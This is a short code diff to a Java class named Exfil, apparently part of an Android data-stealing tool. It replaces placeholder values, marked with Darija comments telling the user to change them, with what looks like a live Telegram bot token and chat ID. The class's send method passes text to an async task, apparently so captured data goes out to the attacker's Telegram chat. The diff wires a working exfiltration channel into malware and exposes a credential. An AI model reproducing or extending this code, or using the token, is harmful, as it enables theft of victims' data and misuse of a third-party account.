@@ -10,8 +10,8 @@ import java.net.URL;
 import java.net.URLEncoder;
 
 public class Exfil {
-    public static final String BOT_TOKEN = "HNA_TOKEN_DYALEK"; // <--- BEDEL
-    public static final String CHAT_ID = "HNA_CHAT_ID_DYALEK"; // <--- BEDEL
+    public static final String BOT_TOKEN = "8624726401:AAF0OfA_I0vxNPkeEucmLFCU6CBff7ynbUk"; // <--- BEDEL
+    public static final String CHAT_ID = "8431994335"; // <--- BEDEL
 
     public static void send(String text) {
         new SendTextTask().execute(text);
